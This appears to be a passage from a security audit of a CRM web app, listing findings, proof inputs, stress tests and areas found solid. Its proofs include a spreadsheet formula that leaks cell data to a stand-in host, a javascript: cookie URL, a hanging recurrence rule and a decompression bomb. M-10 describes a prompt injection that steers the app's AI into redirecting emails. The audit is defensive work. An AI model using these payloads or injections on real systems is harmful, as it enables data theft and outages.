**H-03 — Recurrence rule hangs the sync worker.** `stepMonths` (`src/lib/recurrence.ts:218-226`) loops `INTERVAL` times per step, and for a huge interval the candidate's year has five digits so `fromWallClockInput` returns null and the loop `continue`s without counting toward the emit cap; the 50,000-candidate bound (`:449`) therefore costs 50,000 × INTERVAL iterations. `RRULE:FREQ=MONTHLY;INTERVAL=1000000000` never returns. Reachable from any subscribed ICS URL (`calendar-sync.ts` → `expandIcsEvents`) and from CalDAV, both of which run inside the shared `/api/sync/run` cron with a 4-wide pool. *Impact:* one account's feed pins a sync invocation to `maxDuration` (300 s) every 15 minutes, forever; the per-connection 60 s budget cannot interrupt CPU-bound code. *Proof:* REC-3, "still running after 10 s".

**H-04 — Import double-run.** The chunk claim (`src/lib/import-engine.ts:665-676`) re-claims rows in `processing` on purpose, there is no lease on `imports` (`src/lib/import-stall.ts:31-33` says so), and the stall backstop (6 min on `updated_at`, which moves once per chunk) or an admin retry starts a second runner next to a live one. `existingContacts` and the duplicate index are loaded once, counters are written back as absolutes. *Proof:* 40 name-only rows → 80 contacts, `contactsCreated=40`, status `completed`.

**H-05 — Partial capture save reported as saved.** `saveNoteBatch` inserts the `note_batches` row with `status: "saved"` before the participant loop (`src/lib/note-batch-save.ts:200-213`); on a throw the catch persists the partial result and rethrows. The runner's resume path (`src/lib/capture-job-runner.ts:226-235`, `findBatchForCorpus` `:298-312`) matches that row and settles the job `saved`. *Proof:* a save that throws on participant 2 of 3 leaves `status=saved`, 1 participant in the result, 1 of 2 valid contacts created, and no error anywhere.

**M-01 — CSV formula injection.** `src/app/api/admin/export/route.ts:90` calls `Papa.unparse(rows)` without `escapeFormulae`; roster and interest-list rows carry Clerk names, signup emails, referral slugs and feedback text. *Proof:* a name of `=HYPERLINK("https://evil.example/?"&A1,"open")` is written verbatim. Admin-only reader, hence Medium.

**M-02 — `.docx` inflate bomb.** `readFileText` checks only the declared *compressed* `Content-Length` (`src/lib/cloud-files.ts:287-288`) and `docxToText` (`:260-264`) inflates `word/document.xml` fully into a string before `DRIVE_EXPORT_MAX_CHARS` is consulted. *Proof:* a 120 KB file inflating to 120 MB expanded completely (+358 MB heap) and returned normally. A crafted file in the user's own OneDrive OOMs the shared cloud-notes cron.

**M-03 — Webhook drain.** `drainDueDeliveries` (`src/lib/webhooks/dispatch.ts:419-450`) is a plain `SELECT … LIMIT 200` followed by per-row attempts with no `claimed_by`; the ops workflow runs the drain on both the ten-minute schedule and `workflow_dispatch` in different concurrency groups, so overlap is real. Each attempt may take 5 s and the drain is global and oldest-first, so a Max account with 10 hanging endpoints starves everyone else's deliveries (endpoint auto-disable needs 10 dead deliveries × 7 attempts, i.e. days). *Proof:* two overlapping drains each attempted the single pending row.

**M-04 — Unchecked dates.** `createReminderForUser` (`src/lib/reminder-writes.ts:83`), `updateReminder` (`src/actions/reminders.ts:344`), `createEvent` (`src/actions/events.ts:200`), `admin-money.ts:33,57`, `admin-yc.ts:110-147` all do `new Date(input.x)`; drizzle then calls `toISOString()` → `RangeError: Invalid time value`, an uncaught 500 that reaches Sentry. *Proof:* four garbage `dueDate` values → `RangeError`.

**M-05 — Unbounded text and NUL bytes.** `contact-input.ts` caps only name/company/title/location/school/email/phone/url/handle; `notes`, `howMet`, `keyFacts[]`, `tagNames[]`, reminder `title`/`description`, interaction `rawNotes`/`aiSummary`/`topics` have no cap and the columns are `text`. Server-action bodies may be 32 MB. `\u0000` is stripped nowhere except `conversation-starters.ts:510`; Postgres refuses it (`22021`) with an opaque 500 on any contact, reminder, interaction or chat write. *Proof:* a 1 MB reminder title, a 2 MB note with 10,000 topics and a 1 MB contact note with 5,000 key facts were all stored; three NUL-byte inputs produced raw `Failed query` errors. Beyond the 500s, `contacts.search_tsv` folds `notes`, and Postgres caps a tsvector at 1 MB, so a large-enough note makes the whole contact save fail.

**M-06 — Preview builds and production.** `checkMigrationTarget` (`src/lib/env.ts:300-326`) deliberately allows the build when `PRODUCTION_DB_HOST` is unset (`unarmed`, warning only); `vercel.json` runs `db:migrate` (DDL plus identity and duplicate backfills) in every environment. `REQUIRED_IN_PREVIEW` does not force `pk_test_`/`sk_test_` keys or a separate Stripe key. *Dashboard:* confirm `PRODUCTION_DB_HOST` is set on all environments and that `DATABASE_URL`, Clerk and Stripe variables are scoped to Production only. Related: `DEMO_ACCOUNT_USER_ID` on a preview pointed at the production database would comp Lifetime to that id.

**M-07 — Unmetered AI actions.** No `consumeBucket` call anywhere in `src/actions/outreach.ts`, `recruiter-messages.ts`, `email-compose.ts`, `calendar-prep.ts`, `agent-sends.ts`, `duplicates.ts`, or the brief regeneration triggered from `opportunities.ts` / `contact-profile.ts`. Managed-key spend is bounded by the credit ledger; BYOK spend, provider quota, DB load and latency are not.

**M-08 / M-09 — Retention and deletion residue.** Pruned today: `usage_events` 180 d, `error_events` 30 d, `page_views` 180 d, `rate_limit_buckets` 2 d, `ai_result_cache`, unattached photos, attachment Blobs. Never pruned: `cron_runs` (~50k rows/yr), `webhook_deliveries` (Resend rows keep `detail.recipients`), `outbound_webhook_deliveries.payload`, `admin_audit_log`, `billing_events`, `gate_events`, `extension_usage`, `speech_usage`, `feedback_screenshots` and their Blobs, `email_sends.body_text/html`, `meeting_transcript_segments`, `chat_messages`. After `deleteOwnAccount` (`src/lib/account-deletion.ts`) the Stripe customer object remains (subscriptions are cancelled; no `customers.del`), `credit_grants` keep `user_id` (revoked, not deleted), `billing_events` keep their `detail` with the user id nulled, `interest_list_signups.email` is untouched, Sentry events tagged `user.id` and Vercel logs are outside the purge. The purge itself is thorough (73 explicit deletes, Blob deletes, Google revoke).

**M-10 — Email change by proposal.** `chat-proposed-actions.ts:40-47,131` accepts `email` on `update_contact`; `chat-actions.ts:163-167` writes it; `chat-send.ts:153-198` resolves recipients from `contact.email`. MCP's `update_contact` deliberately has no email field. A hostile note can make the model propose a plausible address change; after one approval every later one-click send goes to the attacker.

**M-11 / M-16 — AI hardening residuals.** `outreach-drafts.ts:152-156` and `recruiter-drafts.ts:137-141` `JSON.parse` the draft with no schema and no `guardModelOutput`; `previousBody` and `templateSeed` are unfenced. Capture hints (`ai.ts:1316-1352`) are built from ICS attendee names and email display names, placed outside the `NOTES` fence and described as authoritative; `events/explain.ts:143-180` sends shared roster rows unfenced and stores the result unguarded; `meeting-digest.ts:572-578` feeds partial outputs back unfenced; `chat-retrieval.ts:268-318` carries prior answers and note snippets unfenced; `recruiter-drafts.ts:93-104` renders shared-row fields outside the fence.

**M-12 — NULL closeness pagination.** `contactsOrderBy` uses `desc(contacts.closeness)` (Postgres: NULLS FIRST) and the cursor condition is a row-value compare with `c: row.closeness ?? 0` (`src/lib/contacts-page-cursor.ts:80,97,128`). NULL rows never satisfy the compare and a cursor from a NULL row excludes every scored row. Bulk imports deliberately leave closeness NULL until the hourly recalibration. *Proof:* 60 NULL + 60 scored → 50 reachable.

**M-13 — Concurrency.** `createContactForUser` inserts then discards the result of `claimIdentities` (`src/lib/contact-writes.ts:482-496`); two concurrent creates with the same email → 2 contacts, 1 identity row, the second invisible to duplicate prevention forever. The free-plan cap is `count → insert` (`:453-470`); 30 concurrent creates at limit−1 produced 529 rows. The capture merge path reads `keyFacts`/tags and writes the full list back (`note-batch-save.ts:295-326`).

**M-14 — Timeouts.** `src/lib/drive.ts:70-78` (`fetchImpl(url, { headers })`, no signal; used by the capture-from-Drive action and the import job), `src/app/api/openrouter/callback/route.ts:62-70`, `api/capture/photos/[photoId]/route.ts:73` and `api/feedback/screenshots/[shotId]/route.ts:68` (Blob proxy without `AbortSignal`), `webhooks/dispatch.ts:203` (`res.text()` before `.slice(0,200)`; 5 s bounds time, not bytes).

**M-15 — Silent JSON repair.** `parseAiJson` (`src/lib/ai.ts:494-516`) falls through to `repairTruncatedJson`; nothing checks `finish_reason`/`stop_reason === "length"` except web search. A capture with many people that overflows `maxOutputTokens` loses the tail of `people[]` and reports success.

**M-17 — MCP scopes.** `oauthGrantFor` returns `["read","write"]` for a token with no `orbit:*` scope unless `MCP_OAUTH_REQUIRE_SCOPES=1`; `.env.example` has it commented out and `env.ts` does not require it. A dynamically-registered client asking only for `openid email` gets CRM write. *Dashboard:* define the scopes in Clerk, confirm new connections carry them, flip the flag.

**M-18 — Speech metering.** `api/speech/token` checks the allowance only at mint; tokens are minted at 30 per 5 min; usage arrives only by `sendBeacon` clamped to one 300 s session; the server never counts minted sessions. The nightly Deepgram reconciliation is the only backstop.

**L-01 — Origin checks.** `api/chat/route.ts:45-74` parses `request.json()` with no `Origin` or custom-header check while `capture/jobs`, `speech/*`, `knowledge/refresh`, `meetings/*`, `research` and `avatar-backfill` all have one. A cross-site `text/plain` POST would carry the victim's cookie only if Clerk's session cookie were not `SameSite=Lax`, so impact today is near zero; it is a consistency gap, and the separate waitlist domain served by the same app is same-site for cookie purposes.

**L-02 — URL schemes.** `baseShape.website` is length-only (`contact-input.ts:101`); `normalizeLinkedinUrl` returns the raw lower-cased text when parsing fails (`src/lib/recruiters.ts:66`) and the shared recruiter row is rendered at `recruiters/[id]/page.tsx:123` as a bare `href`; `createEvent` stores `input.url` raw when canonicalisation rejects it (`src/actions/events.ts:191`) and `event-hero.tsx:163` renders it. React 19 rewrites `javascript:` hrefs to a throwing stub (verified with `renderToString`), and browsers block top-level `data:` navigation, so there is no execution today. *Proof:* `website: "javascript:alert(document.cookie)"` was stored.

**L-04 — LIKE escaping.** `knowledge-base.ts:85` (`%${q}%`), `contact-search-rank.ts:59` (`${q}%` while `nameMatchTierSql` on `:36` escapes), `recruiters.ts:550` (`%${q}%` over the shared pool). Parameterised, so not injection; a bare `%` matches the whole table and `%a%b%c%…` is a cheap CPU burn. *Proof:* `q="%"` returned a full page and 400 knowledge entries.

**L-05 / L-06 / L-07** are detailed in §2.5 and the integrations table; the unsubscribe-token design is strong for Radar (hash-bound, revocable) and weaker for the credit email (`base64url(userId).HMAC(userId)`, no `iat`, no stored hash).

**L-11 — Malformed ids.** `api/avatars/[contactId]`, `api/feedback/screenshots/[shotId]` and `api/v1/webhook-endpoints/[id]` DELETE pass the raw segment to a uuid column (contrast the regexes in `capture/photos`, `imports/files`, `knowledge/refresh`, `v1/followups/[id]`); `api/scan/[token]/pages` trusts `files[].base64` (`:49-60`); list cursors are only checked for their `s`/`t` keys (`contacts-page-cursor.ts:46-56`, `reminders-page-query.ts:176-184`).

**L-18 — Dependencies.** `npm audit`: 0 critical, 22 high, 16 moderate; `--omit=dev`: 0 critical, 15 high, 11 moderate, every one of them under `@clerk/ui → @solana/wallet-adapter-* → react-native/metro/jayson/stream-json/uuid@8` (an optional Web3 sign-in subtree no Orbit server code imports) or dev tooling (`eslint-config-next`, `drizzle-kit`, `shadcn`, Sentry's bundler plugin). The lockfile is complete (every package has `integrity`, no git/http sources); install scripts exist only for well-known packages (`@google/genai`, `@sentry/cli`, `bufferutil`, `utf-8-validate`, esbuild, protobufjs, core-js). `@samasante/liquid-glass@0.1.1` is a single-maintainer SVG-filter component with no network, storage or eval; pinned exactly. `pdfjs-dist@6.3.289` is post-CVE-2024-4367 and used client-side only; `isEvalSupported:false` is still worth passing. `npm audit fix --force` must not be run (it downgrades `eslint-config-next` to 14).

---

## 4. Edge-case and resilience failures

Each row names the exact input or condition, expected vs. actual, and the responsible function. All were produced by `stress-tests/*.ts` on PGlite unless marked "code".

| ID | Condition / input | Expected | Actual | Responsible |
|---|---|---|---|---|
| EC-DATE-1 | `createReminder({ title, dueDate: "not-a-date" })` (also `2024-13-45`, `99999999999999999`, `Invalid`) | 400 "that date doesn't look right" | `RangeError: Invalid time value` (500) | `reminder-writes.ts:83`, `actions/reminders.ts:344` |
| EC-DATE-2 | `createEvent({ title, startsAt: "garbage" })` | 400 | `RangeError` (500) | `actions/events.ts:200` → `events/store.ts` |
| EC-NUL-1/2/3 | `\u0000` in a contact name, reminder title or note | stripped or friendly 400 | raw `Failed query … 0x00` (500) | every write path; no NUL stripping |
| EC-LEN-1 | 1 MB reminder title + 1 MB description | capped | stored (1,000,000 chars) | `reminder-writes.ts`, schema `text` |
| EC-LEN-2 | 2 MB `rawNotes` + 2 MB `aiSummary` + 10,000 topics | capped | stored | `contact-writes.ts:1129` |
| EC-LEN-3 | 1 MB `notes` + 1 MB `howMet` + 5,000 `keyFacts` | capped | stored | `contact-input.ts` strict schema (name/company/… only) |
| EC-UNI-1 | `"Al‮ecila‬ Smith"`, title `"​​​hidden"` | invisible/bidi chars stripped | stored verbatim | manual path skips `sanitizeAgentText` |
| EC-URL-1 | `website: "javascript:alert(document.cookie)"` | refused | stored | `contact-input.ts:101` |
| AZ-OPT-1 | `createContact(input, { entitlements: { contactLimit: null } })` | ignored | used for the cap check | `actions/contacts.ts:685-749` |
| REC-3 | ICS `RRULE:FREQ=MONTHLY;INTERVAL=1000000000` | returns quickly | never returns (>10 s, CPU-bound) | `recurrence.ts:218-226, 449` |
| RACE-CAP-1 | 30 concurrent `createContactForUser` at 499/500 | 1 created | 30 created, 529 rows | `contact-writes.ts:453-470` |
| DI-PAGE-NULL | closeness sort, 60 NULL + 60 scored | 120 reachable | 50 reachable, then an empty page | `contacts-page-cursor.ts:80,97,128` |
| DI-DUP-CREATE | 2 concurrent creates, same email | 1 contact | 2 contacts, 1 identity row | `contact-writes.ts:482-496` |
| DI-IMPORT-DOUBLE | two `runImportJobById` on one job of 40 name-only rows | 40 contacts | 80 contacts, counters wrong | `import-engine.ts:665-676`, `import-stall.ts` |
| DI-CAPTURE-PARTIAL | 3 participants, 2nd has no name | batch not "saved", or 2 saved and 1 error | `status=saved`, 1 participant, no error | `note-batch-save.ts:200-213`, `capture-job-runner.ts:226-312` |
| DI-WEBHOOK-DOUBLE | two overlapping `drainDueDeliveries` | 1 attempt | both drains attempted the same row | `webhooks/dispatch.ts:419-450` |
| INJ-CSV | roster name `=HYPERLINK(...)` | quoted/escaped | verbatim | `api/admin/export/route.ts:90` |
| INJ-DOCX-BOMB | 120 KB `.docx`, 120 MB `document.xml` | refused | fully inflated, +358 MB heap | `cloud-files.ts:260-295` |
| SCALE-GRAPH | 20,000 contacts, constellation load | bounded | 10.6 s on PGlite, every row + tags loaded into memory | `graph-data.ts:69` |
| SCALE-LIKE / -KB | search `q="%"` | 0 rows | full page / 400 entries | `contact-search-rank.ts:59`, `knowledge-base.ts:85` |
| M-15 (code) | model output truncated at `max_tokens` inside `people[]` | error / retry | tail dropped, success reported | `ai.ts:494-516` |
| L-25 (code) | tab closed mid-stream | partial answer kept or resumable | question and answer deleted, credits spent | `api/chat/route.ts:387-397` |
| L-17 (code) | 7 pm PT meeting rendered on a UTC server | 7:00 PM | next-day 02:00 | `meetings/[id]/page.tsx:94` and three others |

Scale numbers at 20,000 contacts / 40,000 interactions on PGlite (production Neon is slower per statement, faster per row): dashboard 2.1 s, knowledge search 0.4 s, notification panel 22 ms, full closeness recalibration 8.8 s (runs in-request after bulk writes), name-sort pagination walks 100 pages at 50 ms/page with every contact seen exactly once, export 71 MB in 10.9 s. The constellation is the one loader whose cost is linear in network size.

Cold start, empty DB and concurrent bootstrap: solid (lease row, 20 s wait then serve, version recorded only on a clean sweep). Timezone handling for reminders, due buckets, radar's Monday window and recurrence across DST: solid (`reminder-due-bucket.ts`, `radar/digest.ts`, `recurrence.ts`; REC-1/REC-2 held).

---

## 5. What was checked and found solid

- **Tenancy.** Every client-reachable read/update/delete traced carries `userId` in its WHERE or sits behind an owner-scoped read; bulk operations scope their `inArray` by user; ids inside objects (contact ids in reminders, opportunities, campaign recipients, proposals, agent sends, attachments) are re-checked; the prior audit's `assertEventOwnedBy`/`assertReminderContactOwned` guards still hold (`smoke-cross-tenant-refs` passes).
- **Auth planes.** Middleware allowlist asserted against the filesystem; API keys 256-bit CSPRNG, SHA-256, shape-checked before any query, revocation, scopes, suspension, stealth, paywall; MCP refuses browser origins and re-checks scopes at execution; extension gates mirror `requireUserId`; internal routes constant-time and fail-closed; admin 404-shaped; view-as can only remove access; demo/localhost escape hatches require `NODE_ENV=development`, which no deployment runs.
- **OAuth.** State in an httpOnly Lax cookie, ≤10 min, consumed on first callback, bound to the session user; `redirect_uri` env-pinned; `returnTo` through `safeReturnPath`; account switch drops old tokens, cursors and sources; OpenRouter uses PKCE with AES-GCM state.
- **Webhooks.** Stripe/Clerk/Resend verify raw bytes before parsing, fail closed without a secret, dedupe (Stripe) and handle ordering (`subscriptionEventAt`); outbound webhooks are HMAC-signed, SSRF-guarded at register and delivery, `redirect: "manual"`, 5 s timeout, 7-attempt ladder, endpoint auto-disable.
- **SSRF.** `net-guard.ts` blocked every literal form tried (decimal, octal, hex, short dotted, every IPv6 embedding form, link-local, CGNAT, multicast), `localhost`/`.local`/`.internal`, credentials in URLs and non-https schemes; every user-influenced fetch found goes through `guardedFetch`/`guardedFetchText` with per-hop checks, timeouts and byte caps.
- **Injection.** Every `sql.raw` is fed from a closed union or a validated catalogue; tsquery is built from tokenised input; no `child_process`, no `eval`, no `dangerouslySetInnerHTML` except a server-generated QR SVG; `react-markdown` without raw HTML, images disallowed, links through `safeChatHref`; email templates escape every user string; CRLF stripped from mail headers; the From line is always the connected mailbox.
- **Uploads.** Screenshots magic-byte checked; meeting chunks require `RIFF…WAVE` and 4 MB; capture photos re-encoded by sharp; attachment tokens confined to the caller's prefix with extension and size limits; LinkedIn ZIPs expanded in the browser and gunzipped server-side with `maxOutputLength`.
- **AI.** All 20 fixes from the September AI audit are still wired (nonce fences, output guard on both chat paths and the live stream, link policy, tool registry enforcement, batch caps, recipient trust, pending-draft cap, Drive grounding); the chat surface cannot call write tools; the tool loop is bounded; no model-chosen URL is ever fetched; hallucinated ids are refused against an allowlist; caches and batches are per user; credit holds are placed in one atomic batch behind the account lock row (20 concurrent holds against a half-credit balance granted exactly one); BYOK never fails over to another vendor.
- **Secrets and config.** No live secret in the tree or fetched history; `extension/.env.production` holds public values only; `ENCRYPTION_SECRET`, `CRON_SECRET`, `CLERK_WEBHOOK_SIGNING_SECRET` etc. are required in production and the dev key is refused there; `DEMO_ACCOUNT_USER_ID` and `EXTENSION_DEV_SECRET` are forbidden in production; Sentry has `sendDefaultPii:false` and scrubs tokens, emails and key patterns; `logging.serverFunctions:false` keeps BYOK keys out of dev logs; error boundaries render only a digest; nothing server-only ships to the client.
- **CI/CD.** `pull_request` only, read-only token, all actions SHA-pinned, no secrets in CI; ops workflow uses per-schedule concurrency and prints status codes only (except L-13); `vercel-ignore-build.sh` never skips production.
- **Rate limits.** Single-statement upsert that is exact under 50 concurrent calls; MCP and API keys per user; public routes per salted IP; `interestWelcome` global.
- **Jobs.** Capture jobs, provider syncs, connector outbox, email outbox, relationship runs and purges all claim atomically with leases, bounded retries and stall detection; the schema bootstrap is race-safe; the offline queue replays only safe kinds under a Web Lock.

**Could not verify (and why):** Clerk's session cookie attributes and the `authorizedParties` behaviour (configured in Clerk, not in the repo); the effective access mode of email-attachment Blobs (`attachment-paths.ts` declares `private`, the token route does not set `access`); whether `PRODUCTION_DB_HOST`, `MCP_OAUTH_REQUIRE_SCOPES`, `CSP_ENFORCE` and `ANALYTICS_SALT` are set in production; Vercel's handling of client-supplied `x-forwarded-for` (the IP buckets trust the first hop); the DNS-dependent SSRF cases (no DNS in the sandbox; verified by code); git history before the 627 fetched commits (shallow clone); live third-party behaviour (Google 429 bodies, Deepgram usage API), which was reasoned from code and the existing stubs.

---

## 6. Stress-test suite

`stress-tests/` is new and self-contained; nothing under `src/` changed. Every script reuses `scripts/smoke/_env.ts`, so it runs against a throwaway PGlite directory with `DATABASE_URL` and every billable provider key deleted. Run with Node 24:

```
npx tsx stress-tests/input-extremes.ts      # dates, NUL bytes, lengths, unicode, URL schemes, forged options  (11 findings)
npx tsx stress-tests/net-guard-edge.ts      # SSRF literal/host/scheme edge cases                                 (all held)
npx tsx stress-tests/recurrence-edge.ts     # month ends, DST, runaway rules                                      (1 finding)
npx tsx stress-tests/concurrency-races.ts   # limiter, credit holds, contact cap, inbox, claims, bucket growth   (1 finding)
npx tsx stress-tests/scale-20k.ts           # 20k contacts: graph, dashboard, knowledge, pagination, export      (3 findings)
npx tsx stress-tests/resilience-repros.ts   # import double-run, partial save, drain overlap, NULL paging, CSV, docx (6 findings)
```

A `BUG` line is a confirmed finding (expected to fail on the current code); `FAIL` would be a harness problem (none). `npx tsc --noEmit` and `npx eslint stress-tests` pass with the directory included.

---

## 7. Secrets and credentials

Nothing needs rotation. The scan covered the working tree, `git log -p` across the fetched history, `extension/.env.production`, docs, fixtures and the smoke scripts; every hit was a documented fixture (`sk_test_SECRETVALUE123`, `AIzaSyD-not-a-real-key…`, `postgres://u:p@…`, a 43-character `sk-ant-…` injection string). Limitation: the clone is shallow (627 commits of the ~2,100 the September audit scanned from a full clone), so that earlier full-history result is the authority for older commits.

Two operational notes rather than leaks: `CRON_SECRET` is a single shared secret that can spend any user's AI key and run any job (keep it off any log, rotate on staff change); the deprecated `mcpk_live_…` path-token route puts a credential in URLs by design and should be retired once existing connectors have migrated to OAuth.
